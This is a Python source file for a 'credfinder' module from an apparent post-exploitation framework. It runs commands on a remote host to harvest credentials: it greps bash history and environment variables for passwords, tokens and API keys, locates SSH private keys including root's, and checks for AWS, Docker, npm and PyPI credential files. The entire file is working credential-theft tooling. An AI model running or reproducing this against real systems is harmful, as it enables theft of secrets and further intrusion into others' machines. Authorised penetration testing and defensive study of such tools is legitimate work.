"""
Credentials finder module.

Search for potential credentials in common locations like configuration files,
bash history, and environment variables.
"""

from typing import Dict, Any
from modules.postexploit.base_module import BaseModule


class CredentialsFinderModule(BaseModule):
    """Find potential credentials on the remote host."""
    
    _name = "credfinder"
    
    @property
    def name(self) -> str:
        return "credfinder"
    
    @property
    def description(self) -> str:
        return "Search for potential credentials in common locations"
    
    @property
    def category(self) -> str:
        return "recon"
    
    async def run(self) -> Dict[str, Any]:
        """
        Search for credentials on the remote host.
        
        Returns:
            Dictionary with found credentials
        """
        hostname = self.get_hostname()
        self.log_info(f"Searching for credentials on {hostname}")
        
        try:
            results = {
                'success': True,
                'hostname': hostname,
                'data': {
                    'bash_history': [],
                    'env_vars': [],
                    'config_files': [],
                    'ssh_keys': []
                }
            }
            
            # Search bash history for passwords and API keys (with more specific patterns)
            try:
                bash_history = await self.execute_command(
                    "grep -E -i '(password=|passwd=|pwd=|api_key=|token=|secret=|PASSWORD=|PASSWD=|PWD=|API_KEY=|TOKEN=|SECRET=)' ~/.bash_history 2>/dev/null | tail -20"
                )
                if bash_history.strip():
                    results['data']['bash_history'] = bash_history.strip().split('\n')
                    self.log_success(f"Found {len(results['data']['bash_history'])} entries in bash history")
            except Exception as e:
                self.log_warning(f"Could not search bash history: {e}")
            
            # Check environment variables
            try:
                env_vars = await self.execute_command(
                    "env | grep -E -i '(password|passwd|pwd|api_key|token|secret|key)'"
                )
                if env_vars.strip():
                    results['data']['env_vars'] = env_vars.strip().split('\n')
                    self.log_success(f"Found {len(results['data']['env_vars'])} interesting environment variables")
            except Exception as e:
                self.log_warning(f"Could not check environment variables: {e}")
            
            # Search for SSH keys
            try:
                ssh_keys = await self.execute_command(
                    "find ~/.ssh /home/*/.ssh /root/.ssh -type f -name 'id_*' 2>/dev/null"
                )
                if ssh_keys.strip():
                    results['data']['ssh_keys'] = ssh_keys.strip().split('\n')
                    self.log_success(f"Found {len(results['data']['ssh_keys'])} SSH keys")
            except Exception as e:
                self.log_warning(f"Could not search for SSH keys: {e}")
            
            # Search common config files
            config_files = [
                "~/.aws/credentials",
                "~/.docker/config.json",
                "~/.gitconfig",
                "~/.npmrc",
                "~/.pypirc"
            ]
            
            found_configs = []
            for config_file in config_files:
                try:
                    check = await self.execute_command(f"test -f {config_file} && echo 'found' || echo 'not_found'")
                    if 'found' in check and 'not_found' not in check:
                        found_configs.append(config_file)
                except:
                    pass
            
            results['data']['config_files'] = found_configs
            if found_configs:
                self.log_success(f"Found {len(found_configs)} configuration files")
            
            # Summary
            total_findings = (
                len(results['data']['bash_history']) +
                len(results['data']['env_vars']) +
                len(results['data']['ssh_keys']) +
                len(results['data']['config_files'])
            )
            
            self.log_success(f"Credentials search complete: {total_findings} total findings")
            return results
            
        except Exception as e:
            self.log_error(f"Credentials search failed: {e}")
            return {
                'success': False,
                'hostname': hostname,
                'error': str(e),
                'data': {}
            }
